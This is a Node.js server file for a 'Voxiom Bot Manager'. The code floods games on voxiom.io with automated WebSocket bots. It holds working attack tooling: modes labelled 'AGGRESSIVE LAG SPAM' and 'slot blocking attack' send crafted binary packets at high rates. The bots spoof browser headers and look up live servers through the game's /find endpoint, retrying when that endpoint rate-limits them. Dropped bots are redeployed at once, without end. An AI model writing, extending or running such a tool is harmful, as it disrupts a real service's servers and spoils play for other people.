const express = require('express');
const WebSocket = require('ws');
const path = require('path');
const http = require('http');
const https = require('https');

const app = express();

console.log('='.repeat(50));
console.log('🚀 VOXIOM BOT MANAGER - ULTIMATE v23');
console.log('🏗️ FIXED /find PARSING | RATE LIMIT PROTECTION');
console.log('='.repeat(50));

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.set('trust proxy', true);

// ==================== BOT SYSTEM STATE ====================
const bots = new Map();
let botIdCounter = 0;
let totalDeployed = 0;

let currentSession = {
    url: null,
    mode: null,
    active: false,
    sessionId: null,
    isDeploying: false,
    botConfig: {}
};

// ==================== MODE CONFIGURATIONS ====================
const MODES = {
    lag: {
        label: 'AGGRESSIVE LAG SPAM',
        handshake: Buffer.from([0x03, 0x87, 0x05, 0x02, 0x06]),
        heartbeatMs: 1000,
        tickMs: 10,
        jumpEvery: 15,
        slot: 1,
        description: 'Extreme lag - 100 packets/sec spam'
    },
    pillar: {
        label: 'PILLAR + SLOT BLOCK',
        handshake: Buffer.from([0x03, 0x87, 0x03, 0x02, 0x05]),
        heartbeatMs: 50,
        tickMs: 25,
        jumpEvery: 40,
        placeAfter: 8,
        slot: 3,
        description: 'Pillar jumping + slot blocking attack'
    },
    dig: {
        label: 'DIG BOT',
        handshake: Buffer.from([0x03, 0x87, 0x03, 0x02, 0x05]),
        heartbeatMs: 50,
        tickMs: 50,
        slot: 1,
        description: 'Dig mode bot'
    }
};

// ==================== REGION & GAME MODE MAPPING ====================
const REGION_NAMES = {
    0: 'US-West',
    1: 'US-East',
    2: 'Europe',
    3: 'Asia'
};

const GAME_MODE_CONFIG = {
    ctg: { name: 'Capture The Gems', urlType: 'normal' },
    br: { name: 'Battle Royale', urlType: 'normal' },
    svv: { name: 'Survival', urlType: 'normal' },
    ffa: { name: 'Free For All', urlType: 'experimental' }
};

// Rate limiting tracker
const findRateLimit = {
    lastCall: 0,
    callCount: 0,
    isBlocked: false,
    blockUntil: 0
};

// ==================== FIND ENDPOINT (FIXED PARSING) ====================
async function callFindEndpoint(region, gameMode, retryCount = 0) {
    return new Promise((resolve, reject) => {
        if (findRateLimit.isBlocked && Date.now() < findRateLimit.blockUntil) {
            const waitTime = Math.ceil((findRateLimit.blockUntil - Date.now()) / 1000);
            reject(new Error(`Rate limited. Wait ${waitTime} seconds.`));
            return;
        }
        
        if (Date.now() - findRateLimit.lastCall > 5000) {
            findRateLimit.callCount = 0;
        }
        
        if (findRateLimit.callCount >= 3 && retryCount === 0) {
            findRateLimit.isBlocked = true;
            findRateLimit.blockUntil = Date.now() + 10000;
            reject(new Error('Rate limit reached. Waiting 10 seconds.'));
            return;
        }
        
        findRateLimit.lastCall = Date.now();
        findRateLimit.callCount++;
        
        const url = `https://voxiom.io/find?region=${region}&game_mode=${gameMode}&version=137`;
        
        console.log(`   📡 /find request: ${url}`);
        
        const options = {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json',
                'Origin': 'https://voxiom.io',
                'Referer': 'https://voxiom.io/'
            },
            timeout: 10000
        };
        
        const req = https.get(url, options, (res) => {
            let data = '';
            
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                // Check for HTML response (rate limit)
                if (data.trim().startsWith('<') || data.trim().startsWith('<!DOCTYPE')) {
                    console.log(`   ⚠️ Received HTML - rate limited`);
                    
                    if (retryCount < 3) {
                        const delay = 2000 * (retryCount + 1);
                        console.log(`   🔄 Retry in ${delay/1000}s...`);
                        setTimeout(() => {
                            callFindEndpoint(region, gameMode, retryCount + 1)
                                .then(resolve)
                                .catch(reject);
                        }, delay);
                    } else {
                        reject(new Error('Rate limited by Voxiom. Try again later.'));
                    }
                    return;
                }
                
                try {
                    const json = JSON.parse(data);
                    console.log(`   📡 Response:`, json);
                    
                    // The response can have 'tag' directly or in different format
                    let serverTag = null;
                    if (json.tag) {
                        serverTag = json.tag;
                    } else if (json.success && json.tag) {
                        serverTag = json.tag;
                    } else if (json.ip) {
                        // Extract tag from ip like "game-server-fVcRz"
                        const ipMatch = json.ip.match(/game-server-([a-zA-Z0-9]+)/);
                        if (ipMatch) serverTag = ipMatch[1];
                    }
                    
                    if (serverTag) {
                        console.log(`   ✅ Got server tag: ${serverTag}`);
                        resolve({ success: true, tag: serverTag });
                    } else {
                        reject(new Error('No tag found in response: ' + JSON.stringify(json)));
                    }
                } catch (e) {
                    console.error(`   ❌ JSON parse error:`, e.message);
                    if (retryCount < 3) {
                        const delay = 2000 * (retryCount + 1);
                        console.log(`   🔄 Retry in ${delay/1000}s...`);
                        setTimeout(() => {
                            callFindEndpoint(region, gameMode, retryCount + 1)
                                .then(resolve)
                                .catch(reject);
                        }, delay);
                    } else {
                        reject(new Error('Failed to parse response'));
                    }
                }
            });
        });
        
        req.on('error', (err) => {
            console.error(`   ❌ Request error:`, err.message);
            if (retryCount < 3) {
                setTimeout(() => {
                    callFindEndpoint(region, gameMode, retryCount + 1)
                        .then(resolve)
                        .catch(reject);
                }, 2000);
            } else {
                reject(err);
            }
        });
        
        req.setTimeout(10000, () => {
            req.destroy();
            if (retryCount < 3) {
                setTimeout(() => {
                    callFindEndpoint(region, gameMode, retryCount + 1)
                        .then(resolve)
                        .catch(reject);
                }, 2000);
            } else {
                reject(new Error('Request timeout'));
            }
        });
    });
}

// ==================== URL CONVERTER ====================
function convertToWssUrl(input) {
    if (!input) return '';
    input = input.trim();
    
    if (input.startsWith('wss://')) return input;
    
    let match = input.match(/voxiom\.io\/experimental#([a-zA-Z0-9-]+)/);
    if (match) return `wss://game-server-${match[1]}.voxiom.io:443`;
    
    match = input.match(/https?:\/\/voxiom\.io\/experimental#([a-zA-Z0-9-]+)/);
    if (match) return `wss://game-server-${match[1]}.voxiom.io:443`;
    
    match = input.match(/voxiom\.io\/#([a-zA-Z0-9-]+)/);
    if (match) return `wss://game-server-${match[1]}.voxiom.io:443`;
    
    if (/^[a-zA-Z0-9-]+$/.test(input)) return `wss://game-server-${input}.voxiom.io:443`;
    
    match = input.match(/game-server-([a-zA-Z0-9-]+)\.voxiom\.io/);
    if (match) return `wss://game-server-${match[1]}.voxiom.io:443`;
    
    return input;
}

function getGameUrl(tag, gameMode) {
    const config = GAME_MODE_CONFIG[gameMode];
    if (config && config.urlType === 'experimental') {
        return `https://voxiom.io/experimental/#${tag}`;
    }
    return `https://voxiom.io/#${tag}`;
}

// ==================== BOT CLASS ====================
class VoxiomBot {
    constructor(id, url, mode, timer, cycle, sessionId, rejoinDelay = 1, serverTag = null, gameMode = null, region = null) {
        this.id = id;
        this.url = url;
        this.mode = mode;
        this.serverTag = serverTag;
        this.gameMode = gameMode;
        this.region = region;
        this.cfg = MODES[mode];
        this.ws = null;
        this.alive = false;
        this.seq = 0;
        this.yaw = Math.random() * Math.PI * 2;
        this.pitch = (mode === 'pillar' || mode === 'dig') ? -1.5 : (Math.random() - 0.5) * 1.0;
        this.tickCycle = 0;
        this.customTimer = timer;
        this.cycle = cycle;
        this.sessionId = sessionId;
        this.rejoinDelay = rejoinDelay;
        this.timerStarted = false;
        this.redeployAttempts = 0;
        this.isDisconnecting = false;
        this.packetsSent = 0;
        
        bots.set(this.id, this);
        totalDeployed++;
        console.log(`[Bot #${this.id}] Created - Mode: ${mode}, Server: ${serverTag || 'unknown'}`);
        this.connect();
    }

    buildPacket(opts = {}) {
        const isSlot = (opts.slot !== undefined);
        const buf = Buffer.alloc(isSlot ? 22 : 21);
        
        buf[0] = (this.seq / 0x100000000) >>> 0 & 0xFF;
        buf[1] = (this.seq >>> 24) & 0xFF;
        buf[2] = (this.seq >>> 16) & 0xFF;
        buf[3] = (this.seq >>> 8) & 0xFF;
        buf[4] = (this.seq >>> 0) & 0xFF;
        
        buf[5] = 0; buf[6] = 0; buf[7] = 0; buf[8] = 0;
        
        if (this.mode === 'pillar' || this.mode === 'dig') {
            buf[9] = 0xbf; buf[10] = 0xc9; buf[11] = 0x0f; buf[12] = 0xdb;
        } else {
            buf.writeFloatBE(this.pitch, 9);
        }
        
        buf.writeFloatBE(this.yaw, 13);
        buf[17] = 0x7f; buf[18] = 0x7f;
        
        if (isSlot) {
            buf[19] = 0x01; buf[20] = 0x00; buf[21] = opts.slot & 0xFF;
        } else if (opts.jump) {
            buf[19] = 0x02;
            buf[20] = this.mode === 'pillar' ? 0x03 : 0x00;
        } else if (opts.place) {
            buf[19] = 0x00; buf[20] = 0x00;
        } else if (opts.click) {
            buf[19] = 0x00; buf[20] = 0x00;
        } else {
            buf[19] = 0x00; buf[20] = 0x03;
        }
        
        this.seq++;
        return buf;
    }

    buildDigPacket() {
        return Buffer.from([0x1a, 0x00, 0x10, 0x00, 0x03, 0xff, 0xec, 0x00, 0x00]);
    }

    tickPillar() {
        if (!this.ws || this.ws.readyState !== 1) return;
        
        this.yaw += 0.008;
        if (this.yaw > Math.PI * 2) this.yaw -= Math.PI * 2;
        
        this.tickCycle++;
        const phase = this.tickCycle % this.cfg.jumpEvery;
        
        if (phase === 0) {
            this.ws.send(this.buildPacket({ slot: this.cfg.slot }));
            this.packetsSent++;
        } else if (phase === 1) {
            this.ws.send(this.buildPacket({ jump: true }));
            this.packetsSent++;
        } else if (phase === this.cfg.placeAfter) {
            this.ws.send(this.buildPacket({ place: true }));
            this.packetsSent++;
        } else {
            this.ws.send(this.buildPacket({}));
            this.packetsSent++;
        }
    }

    tickDig() {
        if (!this.ws || this.ws.readyState !== 1) return;
        this.pitch = -1.5;
        this.ws.send(this.buildPacket({}));
        this.ws.send(this.buildDigPacket());
        this.packetsSent += 2;
    }

    tickLag() {
        if (!this.ws || this.ws.readyState !== 1) return;
        
        this.yaw += (Math.random() - 0.5) * 0.3;
        if (this.yaw > Math.PI * 2) this.yaw -= Math.PI * 2;
        if (this.yaw < 0) this.yaw += Math.PI * 2;
        
        this.pitch += (Math.random() - 0.5) * 0.2;
        this.pitch = Math.max(-1.5, Math.min(1.5, this.pitch));
        
        this.tickCycle++;
        const phase = this.tickCycle % this.cfg.jumpEvery;
        
        try {
            this.ws.send(this.buildPacket({ click: true }));
            this.packetsSent++;
            
            if (phase % 2 === 0) {
                this.ws.send(this.buildPacket({ click: true }));
                this.packetsSent++;
            }
            
            if (phase === 1 || phase === 5 || phase === 10) {
                this.ws.send(this.buildPacket({ jump: true }));
                this.packetsSent++;
            }
        } catch (e) {}
    }

    tick() {
        if (!this.ws || this.ws.readyState !== 1) return;
        
        if (this.sessionId && currentSession.sessionId !== this.sessionId) {
            this.disconnect();
            return;
        }

        if (this.mode === 'pillar') {
            this.tickPillar();
        } else if (this.mode === 'dig') {
            this.tickDig();
        } else {
            this.tickLag();
        }
    }

    connect() {
        if (this.sessionId && currentSession.sessionId !== this.sessionId) return;
        
        console.log(`[Bot #${this.id}] Connecting to ${this.url}...`);
        
        const options = {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Origin': 'https://voxiom.io',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache'
            },
            handshakeTimeout: 10000
        };
        
        try {
            this.ws = new WebSocket(this.url, options);
        } catch (e) {
            console.error(`[Bot #${this.id}] WS error:`, e.message);
            setTimeout(() => this.handleDisconnect(), 1);
            return;
        }
        
        const timeout = setTimeout(() => {
            if (!this.alive && this.ws) {
                this.ws.close();
                this.handleDisconnect();
            }
        }, 15000);
        
        this.ws.on('open', () => {
            clearTimeout(timeout);
            this.alive = true;
            this.seq = 0;
            this.ws.send(this.cfg.handshake);
            console.log(`[Bot #${this.id}] ✅ Connected`);
            
            const hb = setInterval(() => {
                if (this.ws && this.ws.readyState === 1 && this.alive) {
                    this.ws.send(Buffer.from([0x06]));
                }
            }, this.cfg.heartbeatMs);
            this._hb = hb;
            
            setTimeout(() => {
                this._tt = setInterval(() => this.tick(), this.cfg.tickMs);
            }, 600);
        });
        
        this.ws.on('message', () => {
            if (this.timerStarted) return;
            this.timerStarted = true;
            
            this.ws.send(this.buildPacket({ slot: this.cfg.slot }));
            console.log(`[Bot #${this.id}] 🎮 Joined`);
            
            let timeLeft = this.customTimer;
            this._killTimer = setInterval(() => {
                if (--timeLeft <= 0) {
                    clearInterval(this._killTimer);
                    console.log(`[Bot #${this.id}] ⏰ Timer expired`);
                    this.handleDisconnect();
                }
            }, 1000);
        });
        
        this.ws.on('error', (error) => {
            console.error(`[Bot #${this.id}] Error:`, error.message);
        });
        
        this.ws.on('close', (code) => {
            console.log(`[Bot #${this.id}] Closed (${code})`);
            this.handleDisconnect();
        });
    }

    handleDisconnect() {
        if (this.isDisconnecting) return;
        this.isDisconnecting = true;

        if (this._hb) clearInterval(this._hb);
        if (this._tt) clearInterval(this._tt);
        if (this._killTimer) clearInterval(this._killTimer);
        
        if (this.ws) {
            try { this.ws.close(); } catch(e) {}
            this.ws = null;
        }
        this.alive = false;
        bots.delete(this.id);

        if (this.cycle && currentSession.isDeploying && currentSession.sessionId === this.sessionId) {
            this.redeployAttempts++;
            console.log(`[Bot #${this.id}] ⚡ INSTANT REDEPLOY #${this.redeployAttempts}`);
            
            if (currentSession.isDeploying && currentSession.sessionId === this.sessionId) {
                botIdCounter++;
                const newBot = new VoxiomBot(
                    botIdCounter,
                    this.url,
                    this.mode,
                    this.customTimer,
                    true,
                    this.sessionId,
                    1,
                    this.serverTag,
                    this.gameMode,
                    this.region
                );
                bots.set(newBot.id, newBot);
            }
        }
    }

    disconnect() {
        this.cycle = false;
        if (this._hb) clearInterval(this._hb);
        if (this._tt) clearInterval(this._tt);
        if (this._killTimer) clearInterval(this._killTimer);
        if (this.ws) {
            try { this.ws.close(); } catch(e) {}
            this.ws = null;
        }
        this.alive = false;
        bots.delete(this.id);
    }
}

// ==================== API ENDPOINTS ====================

app.post('/api/deploy', (req, res) => {
    let { url, count, mode, timer, cycle, rejoinDelay } = req.body;
    
    console.log('='.repeat(50));
    console.log(`📦 DEPLOY: ${url}`);
    
    url = convertToWssUrl(url);
    
    if (!url || !url.startsWith('wss://')) {
        return res.status(400).json({ success: false, error: 'Invalid URL' });
    }
    if (!MODES[mode]) {
        return res.status(400).json({ success: false, error: 'Invalid mode' });
    }
    
    const botCount = Math.min(100, Math.max(1, parseInt(count) || 1));
    const botTimer = Math.max(1, parseInt(timer) || 60);
    const botCycle = true;
    const botRejoinDelay = 1;
    const sessionId = Date.now() + '_' + Math.random().toString(36);
    
    currentSession = {
        url,
        mode,
        active: true,
        sessionId,
        isDeploying: true,
        botConfig: { count: botCount, timer: botTimer, rejoinDelay: botRejoinDelay }
    };
    
    console.log(`   Deploying: ${botCount} ${mode.toUpperCase()} bots`);
    console.log('='.repeat(50));
    
    for (let i = 0; i < botCount; i++) {
        setTimeout(() => {
            if (currentSession.sessionId === sessionId && currentSession.isDeploying) {
                botIdCounter++;
                new VoxiomBot(
                    botIdCounter, url, mode, botTimer, botCycle, sessionId, botRejoinDelay
                );
            }
        }, i * 100);
    }
    
    res.json({
        success: true,
        message: `Deployed ${botCount} bot(s)`,
        deployed: botCount
    });
});

app.post('/api/deploy-to-find', async (req, res) => {
    let { region, gameMode, count, mode, timer, cycle, rejoinDelay } = req.body;
    
    console.log('='.repeat(50));
    console.log(`🎮 DEPLOY: ${REGION_NAMES[region]} - ${gameMode.toUpperCase()}`);
    
    const validRegions = [0, 1, 2, 3];
    const validModes = ['ctg', 'br', 'ffa', 'svv'];
    
    if (!validRegions.includes(region)) {
        return res.status(400).json({ success: false, error: 'Invalid region' });
    }
    if (!validModes.includes(gameMode)) {
        return res.status(400).json({ success: false, error: 'Invalid game mode' });
    }
    if (!MODES[mode]) {
        return res.status(400).json({ success: false, error: 'Invalid bot mode' });
    }
    
    const botCount = Math.min(20, Math.max(1, parseInt(count) || 1));
    const botTimer = Math.max(1, parseInt(timer) || 60);
    const botCycle = true;
    const botRejoinDelay = Math.max(0, Math.min(2000, parseInt(rejoinDelay) || 1));
    
    try {
        await new Promise(r => setTimeout(r, 500));
        
        const findData = await callFindEndpoint(region, gameMode);
        
        if (!findData.success || !findData.tag) {
            return res.status(500).json({ success: false, error: 'Failed to get server from /find' });
        }
        
        const serverTag = findData.tag;
        const wssUrl = convertToWssUrl(serverTag);
        const gameUrl = getGameUrl(serverTag, gameMode);
        const sessionId = Date.now() + '_' + Math.random().toString(36);
        
        console.log(`   ✅ Server tag: ${serverTag}`);
        console.log(`   🔗 Game URL: ${gameUrl}`);
        console.log(`   🔌 WebSocket: ${wssUrl}`);
        
        findRateLimit.callCount = 0;
        findRateLimit.isBlocked = false;
        
        currentSession = {
            url: wssUrl,
            mode,
            active: true,
            sessionId,
            isDeploying: true,
            botConfig: { count: botCount, timer: botTimer, rejoinDelay: botRejoinDelay }
        };
        
        for (let i = 0; i < botCount; i++) {
            setTimeout(() => {
                if (currentSession.sessionId === sessionId && currentSession.isDeploying) {
                    botIdCounter++;
                    const newBot = new VoxiomBot(
                        botIdCounter, wssUrl, mode, botTimer, botCycle, sessionId, botRejoinDelay,
                        serverTag, gameMode, region
                    );
                    bots.set(newBot.id, newBot);
                }
            }, i * 100);
        }
        
        console.log(`✅ Deployed ${botCount} ${mode.toUpperCase()} bots to ${REGION_NAMES[region]} - ${gameMode.toUpperCase()}`);
        console.log('='.repeat(50));
        
        res.json({
            success: true,
            deployed: botCount,
            serverTag: serverTag,
            gameUrl: gameUrl,
            message: `Deployed ${botCount} bots to ${REGION_NAMES[region]} - ${gameMode.toUpperCase()}`
        });
        
    } catch (error) {
        console.error(`❌ Error:`, error.message);
        findRateLimit.isBlocked = true;
        findRateLimit.blockUntil = Date.now() + 15000;
        res.status(429).json({ success: false, error: error.message });
    }
});

app.post('/api/clear-url', (req, res) => {
    console.log(`🧹 CLEAR URL`);
    currentSession.active = false;
    currentSession.isDeploying = false;
    currentSession.sessionId = null;
    
    const killed = bots.size;
    bots.forEach(bot => bot.disconnect());
    bots.clear();
    
    res.json({ success: true, killed });
});

app.post('/api/kill-all', (req, res) => {
    console.log(`💀 KILL ALL`);
    currentSession.active = false;
    currentSession.isDeploying = false;
    currentSession.sessionId = null;
    
    const killed = bots.size;
    bots.forEach(bot => bot.disconnect());
    bots.clear();
    
    res.json({ success: true, killed });
});

app.post('/api/kill/:id', (req, res) => {
    const botId = parseInt(req.params.id);
    let found = null;
    for (const bot of bots.values()) {
        if (bot.id === botId) {
            found = bot;
            break;
        }
    }
    if (!found) {
        return res.status(404).json({ success: false });
    }
    found.disconnect();
    res.json({ success: true });
});

app.get('/api/status', (req, res) => {
    const botArray = Array.from(bots.values());
    const activeBots = botArray.filter(b => b.alive);
    
    res.json({
        success: true,
        active: activeBots.length,
        total: botArray.length,
        totalDeployed: botIdCounter,
        currentUrl: currentSession.url,
        currentMode: currentSession.mode,
        sessionActive: currentSession.active,
        infiniteRedeployActive: currentSession.isDeploying,
        bots: activeBots.map(bot => ({
            id: bot.id,
            mode: bot.mode,
            alive: bot.alive,
            serverTag: bot.serverTag
        }))
    });
});

app.get('/api/health', (req, res) => {
    const activeBots = Array.from(bots.values()).filter(b => b.alive).length;
    const mem = process.memoryUsage();
    res.json({
        status: 'ok',
        activeBots: activeBots,
        totalBots: bots.size,
        memoryMB: (mem.heapUsed / 1024 / 1024).toFixed(1),
        uptime: process.uptime()
    });
});

app.get('/healthz', (req, res) => {
    res.status(200).send('OK');
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ==================== START SERVER ====================
const PORT = parseInt(process.env.PORT) || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n✅ Server running on port ${PORT}`);
    console.log(`🌐 http://localhost:${PORT}`);
    console.log(`🎮 MODES: LAG, PILLAR, DIG`);
    console.log(`🔍 /find response parser: FIXED`);
    console.log(`🛡️ Rate limit protection: ACTIVE\n`);
});

setInterval(() => {
    const active = Array.from(bots.values()).filter(b => b.alive).length;
    if (bots.size > 0) {
        console.log(`📊 Active: ${active}/${bots.size}`);
    }
}, 10000);

process.on('SIGINT', () => {
    console.log('\n🛑 Shutting down...');
    for (const bot of bots.values()) bot.disconnect();
    process.exit(0);
});
